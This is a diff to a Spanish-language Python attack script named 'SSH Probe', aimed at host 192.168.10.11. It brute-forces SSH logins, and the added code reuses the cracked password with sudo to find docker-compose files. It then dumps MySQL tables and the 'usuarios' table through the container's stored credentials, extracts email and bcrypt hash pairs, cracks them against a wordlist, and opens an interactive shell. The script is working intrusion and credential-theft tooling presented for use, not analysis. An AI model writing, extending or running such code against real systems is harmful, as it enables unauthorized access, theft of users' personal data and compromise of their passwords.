@@ -1,14 +1,18 @@
 #!/usr/bin/env python3
 """
-SSH Probe - configurado para 192.168.10.11 (Linux/Mac)
+SSH Probe - Versión Extendida (Linux/Mac)
+Configurado para 192.168.10.11
+Extrae tablas, busca hashes y crackea contraseñas.
 """
 import sys
 import time
 import paramiko
+import os
+import bcrypt
 import select
 
 # ---------- CONFIG ----------
-HOST_DEFAULT = "192.168.10.11"     # ⬅ IP
+HOST_DEFAULT = "192.168.10.11"
 TIMEOUT = 6
 DELAY_ENTRE_INTENTOS = 1.5
 LOG_FILE = "probe.log"
@@ -53,6 +57,92 @@ def probar(host, user, password):
         log(f"   [!] error de red con {user}:{password} -> {e}")
         return None
 
+def buscar_carpeta_docker(cli, user, password):
+    log("[*] Buscando la carpeta de Docker en el servidor...")
+    cmd_buscar = "sudo -S find / -name 'docker-compose.y*ml' -not -path '*/proc/*' -not -path '*/sys/*' 2>/dev/null | head -n 1"
+    stdin, stdout, stderr = cli.exec_command(cmd_buscar)
+    stdin.write(password + "\n")
+    stdin.flush()
+    resultado = stdout.read().decode(errors="ignore").strip()
+    if not resultado:
+        log("[-] No se encontró el archivo docker-compose.yml en el servidor.")
+        return None
+    carpeta = os.path.dirname(resultado)
+    log(f"[+] Carpeta encontrada: {carpeta}")
+    return carpeta
+
+def ejecutar_consultas(cli, user, password, carpeta):
+    log(f"\n[*] Ejecutando consultas en la base de datos desde {carpeta}...")
+    
+    ruta = f"cd {carpeta} && " if carpeta else ""
+    
+    comando_tablas = f"{ruta}sudo -S docker compose exec mysql sh -c 'mysql -u\"$MYSQL_USER\" -p\"$MYSQL_PASSWORD\" \"$MYSQL_DATABASE\" -e \"SHOW TABLES;\"'"
+    comando_usuarios = f"{ruta}sudo -S docker compose exec mysql sh -c 'mysql -u\"$MYSQL_USER\" -p\"$MYSQL_PASSWORD\" \"$MYSQL_DATABASE\" -e \"SELECT * FROM usuarios;\"'"
+    
+    for nombre, cmd in [("TABLAS", comando_tablas), ("DATOS DE USUARIOS", comando_usuarios)]:
+        log(f"\n--- {nombre} ---")
+        stdin, stdout, stderr = cli.exec_command(cmd)
+        stdin.write(password + "\n")
+        stdin.flush()
+        
+        while True:
+            linea = stdout.readline()
+            if not linea:
+                break
+            print(linea, end="")
+            
+        err = stderr.read().decode(errors="ignore")
+        err_limpio = err.replace(f"[sudo] password for {user}:", "").strip()
+        if "Using a password on the command line interface can be insecure" in err_limpio:
+            pass
+        elif err_limpio:
+            print(f"[!] Error: {err_limpio}")
+            
+    log("\n---------------------------\n")
+
+def extraer_y_crackear(cli, user, password, carpeta, diccionario):
+    log("[*] Extrayendo hashes de la base de datos...")
+    
+    ruta = f"cd {carpeta} && " if carpeta else ""
+    comando = f"{ruta}sudo -S docker compose exec -T mysql sh -c 'mysql -B -N -u\"$MYSQL_USER\" -p\"$MYSQL_PASSWORD\" \"$MYSQL_DATABASE\" -e \"SELECT correo, contrasena_hash FROM usuarios;\"'"
+    
+    stdin, stdout, stderr = cli.exec_command(comando)
+    stdin.write(password + "\n")
+    stdin.flush()
+    
+    salida = stdout.read().decode(errors="ignore").strip()
+    
+    hashes = []
+    for linea in salida.splitlines():
+        if "\t" in linea:
+            partes = linea.split("\t")
+            if len(partes) >= 2:
+                hashes.append((partes[0], partes[1]))
+                
+    if not hashes:
+        log("[-] No se pudieron extraer hashes para crackear.")
+        return
+        
+    log(f"[+] Se extrajeron {len(hashes)} hashes.\n")
+    log("[*] Iniciando crackeo de hashes (esto puede tardar)...")
+    
+    for correo, hash_str in hashes:
+        hash_bytes = hash_str.encode('utf-8')
+        encontrada = False
+        
+        for pwd in diccionario:
+            pwd_bytes = pwd.encode('utf-8')
+            try:
+                if bcrypt.checkpw(pwd_bytes, hash_bytes):
+                    log(f"[🔥] ¡ENCONTRADA! Usuario: {correo} | Password: {pwd}")
+                    encontrada = True
+                    break
+            except ValueError:
+                pass
+                
+        if not encontrada:
+            log(f"[-] No encontrada para: {correo}")
+
 def shell_interactiva(cli, user, host):
     log(f"\n[+] Conectado como '{user}' a {host}")
     log("[i] Ya podés trabajar. Escribí 'exit' para cerrar la sesión.\n")
@@ -62,12 +152,11 @@ def shell_interactiva(cli, user, host):
 
     try:
         while True:
-            # Mostrar lo que manda el servidor
             if chan.recv_ready():
                 sys.stdout.write(chan.recv(4096).decode(errors="ignore"))
                 sys.stdout.flush()
 
-            # Enviar lo que escribe el usuario (solo Linux/Mac)
+            # Lógica para Linux/Mac
             r, _, _ = select.select([sys.stdin], [], [], 0.1)
             if r:
                 linea = sys.stdin.readline()
@@ -101,7 +190,7 @@ def main():
             if cli:
                 print("OK ✅")
                 log(f"[+] VÁLIDO: {user}:{pwd}")
-                encontrado = (cli, user)
+                encontrado = (cli, user, pwd)
                 break
             else:
                 print("no")
@@ -114,7 +203,23 @@ def main():
         input("Presioná ENTER para salir...")
         return
 
-    cli, user = encontrado
+    cli, user, pwd = encontrado
+    carpeta = buscar_carpeta_docker(cli, user, pwd)
+    
+    if carpeta:
+        # 1. Mostramos las tablas
+        ejecutar_consultas(cli, user, pwd, carpeta)
+        
+        # 2. Extraemos y crackeamos
+        diccionario = pws
+        if len(sys.argv) == 4:
+             with open(sys.argv[3]) as f:
+                diccionario = [x.strip() for x in f if x.strip()]
+                
+        extraer_y_crackear(cli, user, pwd, carpeta, diccionario)
+    else:
+        log("[-] Saltando consultas de MySQL.")
+
     shell_interactiva(cli, user, host)
     input("\nPresioná ENTER para salir del programa...")
 
